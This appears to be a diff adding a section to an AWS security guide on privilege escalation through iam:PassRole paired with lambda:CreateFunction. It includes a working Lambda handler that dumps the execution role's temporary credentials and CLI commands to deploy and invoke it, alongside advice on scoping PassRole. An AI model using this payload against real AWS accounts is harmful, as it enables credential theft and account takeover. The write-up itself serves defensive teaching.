@@ -96,6 +96,67 @@ unzip -o function.zip
 A leaked `Code.Location` value (in a ticket, a log, a screenshot) discloses the whole
 function package for the life of the URL, to anybody at all.
 
+### PassRole + CreateFunction is a role takeover
+
+`iam:PassRole` is the most commonly misread action in IAM. Holding it on a role gives
+you **none** of that role's permissions and no credentials for it. What it authorises
+is handing the role's ARN to an AWS service during a create call: the service then
+assumes the role itself, using the role's own trust policy, and runs your workload
+under it. `PassRole` exists purely as a guardrail on that handoff, so that not everyone
+who can create compute can attach the account's most privileged role to it.
+
+The consequence is that `PassRole` is only ever dangerous in combination, paired with a
+service that runs attacker-supplied code:
+
+| Service action paired with `iam:PassRole` | How the code gets in |
+|---|---|
+| `lambda:CreateFunction` + `lambda:InvokeFunction` | Function deployment package |
+| `ec2:RunInstances` | Instance user-data script |
+| `ecs:RunTask` | Container image and command |
+| `cloudformation:CreateStack` | Template with a custom resource |
+| `glue:CreateDevEndpoint` | Notebook attached to the endpoint |
+| `sagemaker:CreateNotebookInstance` | Notebook cell |
+| `codebuild:CreateProject` + `codebuild:StartBuild` | Buildspec |
+
+The Lambda variant is the cleanest. The runtime obtains temporary credentials for the
+execution role and injects them into the function process as the ordinary environment
+variables `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` and `AWS_SESSION_TOKEN` (this is
+how the SDKs inside a function pick up their identity). A handler that reads `os.environ`
+and returns it is therefore a complete credential-theft payload, and a synchronous
+(`RequestResponse`) `Invoke` returns the value straight to the caller.
+
+```python
+import os, json
+def handler(event, context):
+    return {"statusCode": 200, "body": json.dumps({
+        "AccessKeyId":     os.environ.get("AWS_ACCESS_KEY_ID"),
+        "SecretAccessKey": os.environ.get("AWS_SECRET_ACCESS_KEY"),
+        "SessionToken":    os.environ.get("AWS_SESSION_TOKEN"),
+    })}
+```
+
+```bash
+zip privesc.zip privesc.py
+aws lambda create-function --function-name exploit   --role arn:aws:iam::<account>:role/<passable-admin-role>   --runtime python3.11 --handler privesc.handler   --zip-file fileb://privesc.zip --region us-east-1
+aws lambda wait function-active --function-name exploit --region us-east-1
+aws lambda invoke --function-name exploit response.json --region us-east-1
+jq -r '.body' response.json | jq '.'
+```
+
+> `create-function` returns while the function is still `State: Pending`; invoking too
+> early fails with `ResourceConflictException`, a timing artefact rather than a
+> permissions problem. Wait with `aws lambda wait function-active` before the first
+> invoke. Cleanup (`DeleteFunction`) usually has to be performed *as the captured role*,
+> because the creating identity typically holds only `CreateFunction` and
+> `InvokeFunction`.
+{: .prompt-warning }
+
+> Scope every `iam:PassRole` to the exact role ARNs a workload legitimately needs, and
+> never make an `AdministratorAccess`-bearing role passable to a non-administrative
+> principal. A correctly scoped `PassRole` (one ARN, not `*`) is still a full account
+> takeover if the single ARN on the other end is an admin role.
+{: .prompt-danger }
+
 ## EC2 Instance Metadata Service (IMDS)
 
 Every EC2 instance can reach a link-local HTTP service at `169.254.169.254`. The
